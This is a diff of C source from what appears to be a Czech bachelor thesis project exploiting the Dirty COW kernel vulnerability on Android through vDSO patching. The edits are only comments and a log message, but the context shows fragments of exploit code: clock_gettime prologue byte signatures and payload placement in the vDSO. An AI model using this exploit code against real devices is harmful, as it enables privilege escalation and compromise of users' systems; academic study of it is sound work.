@@ -1,4 +1,5 @@
 /*
+ * Tento kod je soucast bakalarske prace Aplikace vyuzivajici zranitelnost Dirty Cow pro operacni system Android
  * Autor: Vit Soucek (soucevi1@fit.cvut.cz)
  * Hlavni zdroje:
     - proof-of-concept utoku na Dirty Cow pomoci vDSO uzivatele GitHubu scumjr (https://github.com/scumjr/dirtycow-vdso)
@@ -69,7 +70,7 @@ struct prologue {
 
 // Databaze prologu clock_gettime pro architektury s promenlivou delkou instrukce
 static struct prologue prologues[] = {
-        // 64bitove prology z Githubu uzivatele scumjr
+        // x86-64 prology, zdroj: scumjr
         /* push rbp; mov rbp, rsp; lfence */
         {(char *) "\x55\x48\x89\xe5\x0f\xae\xe8", 7},
         /* push rbp; mov rbp, rsp; push r14 */
@@ -81,11 +82,11 @@ static struct prologue prologues[] = {
         /* push rbp; cmp edi, 1; mov rbp, rsp */
         {(char *) "\x55\x83\xff\x01\x48\x89\xe5", 7},
 
-        // Nove 32bitove prology
+        // Nove x86 prology
         /* push ebp; mov ebp, esp; push edi; push esi; push ebx */
         {(char *) "\x55\x89\xe5\x57\x56\x53",     6},
 
-        // Nove 64bitove prology
+        // Nove x86-64 prology
         /* push rbp; push r13; push r12; push rbx; sub 0x10, rsp */
         {(char*) "\x55\x41\x55\x41\x54\x53\x48\x83\xec\x10", 10},
         /* push rbp; push r14; push r13; push r12; push rbx; mov edi, ebx */
@@ -380,6 +381,7 @@ int build_vDSO_patch(unsigned long vDSO_address, unsigned long gettime_address, 
     vdso_patch[0].patch = payload;
     vdso_patch[0].size = payload_length;
     unsigned long payload_address = vDSO_address + vDSO_size - payload_length;
+    // Zarovnnai adresy na 16 (nekde nemusi byt potreba, ale nicemu nevadi)
     while(payload_address % 16 != 0){
         payload_address--;
     }
@@ -653,7 +655,7 @@ int resolve_architecture(unsigned long vDSO_address, unsigned long *clock_gettim
             return -1;
 
         case ANDROID_CPU_FAMILY_ARM64:
-        LOG("    CPU: AARCH64 -- testing phase");
+        LOG("    CPU: ARM64");
             *clock_gettime_offset = get_clock_gettime_offset_elf(vDSO_address, e64);
             if(*clock_gettime_offset == 0){
                 return -1;
